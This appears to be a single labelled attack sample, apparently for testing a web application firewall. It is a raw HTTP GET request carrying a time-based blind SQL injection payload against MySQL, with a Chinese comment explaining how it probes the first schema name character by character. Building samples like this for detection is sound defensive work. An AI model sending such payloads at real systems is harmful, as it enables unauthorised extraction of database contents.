@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_延时注入-06506261
+# 基于延时注入,将"if(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=119,sleep(3),1)"语句注入到 SQL 查询参数中。攻击者尝试利用 and 和 if 来执行条件判断，如果条件为真，则执行 sleep(3) 进行延时操作。该 SQL 注入语句的攻击目的是通过利用数据库的漏洞，尝试从 information_schema.schemata 表中获取第一个模式（schema）的名称，并检查第一个字符的 ASCII 值是否为 119（'w' 的 ASCII 值）。
+GET /?id=1%20and%20if%28ascii%28substr%28%28select%20schema_name%20from%20information_schema.schemata%20limit%200%2C1%29%2C1%2C1%29%29=119%2Csleep%283%29%2C1%29&bid=hd_tag_m8mv24cs HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24cs
+RM-PRO-Token: 719b1db75196c112429c24083b801c2a
+RM-PRO-Time: 1742808374964
+User-Agent: curl/7.83.1
+
